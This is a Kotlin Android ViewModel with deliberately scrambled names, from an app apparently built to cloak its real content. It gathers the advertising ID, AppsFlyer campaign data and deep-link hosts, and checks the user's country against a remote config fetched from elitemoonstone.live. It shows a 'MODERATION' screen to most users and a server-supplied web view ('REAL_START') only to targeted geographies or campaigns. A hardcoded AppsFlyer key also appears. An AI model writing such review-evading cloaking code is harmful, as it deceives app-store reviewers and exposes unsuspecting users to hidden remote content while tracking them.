package com.junesoftware.maskguns

import android.app.Application
import android.content.Context
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.junesoftware.maskguns.lololo.*
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import javax.inject.Inject

@HiltViewModel
class SortVievModell @Inject constructor(
    private val application: Application
) : ViewModel() {

    var tempApsData = "sad"

    private var ccdcd = MutableLiveData<SortClass>()
    val liveData: LiveData<SortClass>
        get() = ccdcd


    private val vfrrrrr = MutableLiveData<String>()
    val gttgtgttggt: LiveData<String>
        get() = vfrrrrr

    private val vffvvf = MutableLiveData<String?>()
    val vfvfvfvf: LiveData<String?>
        get() = vffvvf

    private val bggbg = MutableLiveData<String?>()
    val jkikilool: LiveData<String?>
        get() = bggbg

    private val bgbgbggb = MutableLiveData<DataFromApiResource<CountryCodeJS?>>()
    val kiikik: LiveData<DataFromApiResource<CountryCodeJS?>>
        get() = bgbgbggb

    private val loooooo = MutableLiveData<DataFromApiResource<GeoDev>>()
    val dataFromApiResourceLiveData: LiveData<DataFromApiResource<GeoDev>>
        get() = loooooo

    private val stringMutableLiveData = MutableLiveData<String>()
    val vfvfvffg: LiveData<String>
        get() = stringMutableLiveData


    private fun saveSharedPref(key: String, data: String?) {
        val sharedPreferences = application.getSharedPreferences(
            Constance.KEY_MAIN_FOR_SHARED_PREF,
            Constance.MODE_PRIVATE
        )
        val editable = sharedPreferences.edit()

        editable.putString(key, data.toString())
        editable.apply()
    }

    private fun frffrrfrf(key: String, defaultValue: String?): String? {
        val gttgtgt = application.getSharedPreferences(
            Constance.KEY_MAIN_FOR_SHARED_PREF,
            Constance.MODE_PRIVATE
        )
        return gttgtgt.getString(key, defaultValue)
    }

    init {

        viewModelScope.launch(Dispatchers.IO) {
            getAdvertisingIdClient()
        }

    }

    fun gtgttgt() {
        ccdcd.value = SortClass.LOADING

        bggbg.value =
            frffrrfrf(Constance.KEY_SHARED_PREF_APPLINK_DATA, null)
        vffvvf.value =
            frffrrfrf(Constance.KEY_SHARED_PREF_APPS_FLY_DATA, null)
        vfrrrrr.value = frffrrfrf(Constance.KEY_SHARED_PREF_LINK, Constance.KEY_NOOOOO_DATA)
        stringMutableLiveData.value =
            frffrrfrf(Constance.KEY_SHARED_PREF_ADVERT_ID, Constance.KEY_NOOOOO_DATA)

        bgbgbggb.value = DataFromApiResource.Loading()
        loooooo.value = DataFromApiResource.Loading()
    }

    fun vvffvvfbgdddddd(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                saveSharedPref(
                    Constance.KEY_SHARED_PREF_APPLINK_DATA,
                    it.targetUri.host.toString()
                )
                bggbg.postValue(it.targetUri.host.toString())

            }
            if (appLinkData == null) {
                if (jkikilool.value == null) {
                    ggttggtgt()
                    bggbg.postValue("null")
                }
            }
        }
    }

    private fun ggttggtgt() {
        saveSharedPref(Constance.KEY_SHARED_PREF_APPLINK_DATA, "null")
    }

    fun gtgtgtgt(): DataForVebViev {
        saveSharedPref(Constance.KEY_SHARED_PREF_ADVERT_ID, vfvfvffg.value.toString())
        saveSharedPref(Constance.KEY_SHARED_PREF_LINK, gttgtgttggt.value.toString())
        saveSharedPref(Constance.KEY_SHARED_PREF_APPLINK_DATA, jkikilool.value.toString())
        saveSharedPref(
            Constance.KEY_SHARED_PREF_APPS_FLY_DATA, vfvfvfvf.value.toString()
        )

        return DataForVebViev(
            appsFlyerDattaGotten = vfvfvfvf.value.toString(),
            advertisingIdClient = vfvfvffg.value.toString(),
            appLinkData = jkikilool.value.toString(),
            linkViev = gttgtgttggt.value.toString()
        )
    }


    suspend fun hyhujikikik() {


        val cdcddccdcd = dataFromApiResourceLiveData.value?.data?.appsChecker ?: "99"

        val hyhyfgggff = kiikik.value?.data?.countryCode ?: "noop"

        val listOfAllGeobgggg = dataFromApiResourceLiveData.value?.data?.geo ?: "none"

        when (cdcddccdcd) {

            "55" -> {
                gtgtjgtjgttg()
            }

            "1" -> {

                var naming = frffrrfrf(Constance.KEY_SHARED_PREF_APPS_FLY_DATA, null)
                var deep = frffrrfrf(Constance.KEY_SHARED_PREF_APPLINK_DATA, null)
                while (true) {

                    if (naming != null && deep != null) {

                        naming = vffvvf.value
                        deep = jkikilool.value

                        saveSharedPref(Constance.KEY_SHARED_PREF_APPLINK_DATA, deep)
                        bggbg.postValue(deep)

                        saveSharedPref(Constance.KEY_SHARED_PREF_APPS_FLY_DATA, naming)
                        vffvvf.postValue(naming)

                        if (
                            deep!!.contains(Constance.KEY_TDB2) || naming!!.contains(
                                Constance.KEY_TDB2
                            ) || listOfAllGeobgggg.contains(hyhyfgggff)
                        ) {
                            ccdcd.postValue(SortClass.REAL_START)
                        } else {
                            ccdcd.postValue(SortClass.MODERATION)
                        }

                        break
                    } else {
                        delay(1000)
                        if (naming == null) {
                            naming =
                                frffrrfrf(Constance.KEY_SHARED_PREF_APPS_FLY_DATA, null)
                        }
                        if (deep == null) {
                            deep =
                                frffrrfrf(Constance.KEY_SHARED_PREF_APPLINK_DATA, null)
                        }
                    }
                }
            }

            else -> {
                if (listOfAllGeobgggg.contains(hyhyfgggff)) {
                    CoroutineScope(Dispatchers.IO).launch {
                        while (true) {
                            if (jkikilool.value != null) {
                                val kikikioooo =
                                    jkikilool.value ?: Constance.KEY_NOOOOO_DATA
                                if (kikikioooo.contains(
                                        Constance.KEY_TDB2
                                    ) || listOfAllGeobgggg.contains(hyhyfgggff)
                                ) {
                                    apppppps()
                                } else {
                                    ccdcd.postValue(SortClass.MODERATION)
                                }
                                break
                            } else {
                                delay(1000)
                            }
                        }
                    }
                } else {
                    frfrrfssssdjjgj()
                }
            }
        }
    }

    private fun apppppps() {
        ccdcd.postValue(SortClass.REAL_START_NO_APPS)
    }

    private fun frfrrfssssdjjgj() {
        ccdcd.postValue(SortClass.MODERATION)
    }

    private fun gtgtjgtjgttg() {
        ccdcd.postValue(SortClass.TEST_VEB)
    }

    fun aaaaapppaa(context: Context) {
        AppsFlyerLib.getInstance()
            .init("JqMzq6FJfWCmagJ7Y2KU3m", hyhyhyjuu, application)
        AppsFlyerLib.getInstance().start(context)
    }

    suspend fun juukikik() {
        val frgtg = gktgktogtktgo()

        try {
            val bbfdddddftgthhyhju = frgtg.getData()
            if (bbfdddddftgthhyhju.isSuccessful) {

                val cooode = bbfdddddftgthhyhju.body()


                bgbgbggb.postValue(DataFromApiResource.Success(data = cooode))

                tghhyyh()
            }

        } catch (e: Exception) {
            bgbgbggb.postValue(DataFromApiResource.Error(message = e.message.toString()))
        }
    }

    private fun gktgktogtktgo() = Retrofit.Builder()
        .addConverterFactory(GsonConverterFactory.create())
        .baseUrl("http://pro.ip-api.com/")
        .build()
        .create(ServiceApi::class.java)

    private suspend fun tghhyyh() {
        val nnnmmkklll = gktoktgtt()

        if (nnnmmkklll.getDataDev().isSuccessful) {

            val result = nnnmmkklll.getDataDev().body()!!

            val responseVeiv = result.view

            vfrrrrr.postValue(responseVeiv)

            loooooo.postValue(DataFromApiResource.Success(data = result))

        } else {
            loooooo.postValue(DataFromApiResource.Error(message = "error during loading"))
        }

        while (true) {
            if (loooooo.value is DataFromApiResource.Success) {
                hyhujikikik()
                break
            } else {
                delay(1000)
            }
        }
    }

    val hyhyhyjuu = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            tempApsData = dataGotten
            vffvvf.postValue(dataGotten)
            saveSharedPref(Constance.KEY_SHARED_PREF_APPS_FLY_DATA, dataGotten)


        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }

    private fun gktoktgtt() = Retrofit.Builder()
        .addConverterFactory(GsonConverterFactory.create())
        .baseUrl("http://elitemoonstone.live/")
        .build()
        .create(ServiceApi::class.java)


    private fun getAdvertisingIdClient() {
        val advertisingIdClient = AdvertisingIdClient(application)
        advertisingIdClient.start()
        val idUserAdvertising = advertisingIdClient.info.id ?: Constance.KEY_NOOOOO_DATA

        stringMutableLiveData.postValue(idUserAdvertising)

    }



}